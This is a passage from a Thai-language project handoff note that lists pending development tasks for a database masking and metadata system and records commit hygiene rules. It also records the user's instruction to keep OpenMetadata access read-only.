7. **FR-1.6** — reconcile cache กับ JDBC introspection จริง (**รอ connection database จริงจากผู้ใช้**)
8. **หน้าเปลี่ยนรหัสผ่าน** — `mustChangePassword` ไหลถึง `auth/authStore.ts` แล้วแต่ไม่มีใครอ่าน
9. **ก่อน M6** ต้องได้คำตอบ: SQL Server production เป็น **2022+** ไหม (ต้องการสำหรับ `GRANT UNMASK` ระดับ column) และลง extension `anon` บน PostgreSQL ได้ไหม
10. **rebuild + restart backend ทุกครั้งที่แตะ backend** — รอบนี้ทำแล้ว (`requiredPrincipals` ข้อ R และ `attr` ข้อ U อยู่ใน jar ที่รันอยู่) · jar เก่าจะ**ไม่ error แต่เมินพารามิเตอร์ใหม่เงียบๆ** ซึ่งอ่านจากหน้าจอไม่ออก
11. งานเล็กที่ค้าง: refactor `jdbcUrl` ที่ยังเป็น private ใน `SourceProbe` ให้ไปอยู่บน `JdbcTargets` · golden-file test ของ dialect ทั้งสองตัว

**กติกาที่ต้องถือไว้ทุกครั้งที่ commit:** repo เป็น public -> scan หา password / JWT / hostname และ IP ภายใน ก่อน push เสมอ · ค่าจริง (`IDENTITY_BOOTSTRAP_ADMIN_PASSWORD`, `OM_WEBHOOK_SECRET`, `FERNET_KEY`, `SRC_PG_ARAK_CREDENTIAL`, bot JWT) อยู่ใน `.env` ที่ gitignore เท่านั้น · `.env.example` มีแต่ placeholder
**ผู้ใช้สั่งไว้:** *"อัพเดตไฟล์ handoff ทุกครั้งที่เอาขึ้น git"* — commit ที่ไม่มี HANDOFF.md ติดไปด้วย ถือว่ายังไม่เสร็จ
**ข้อจำกัดที่ผู้ใช้สั่งไว้:** ต่อ OpenMetadata **read อย่างเดียว** ตอนนี้ — ห้าม PATCH กลับ (FR-1.7 จึงยังไม่ทำ)

**คำสั่งที่ใช้บ่อย** — ดูหัวข้อ 7 ของ [docs/DESIGN.md](docs/DESIGN.md)
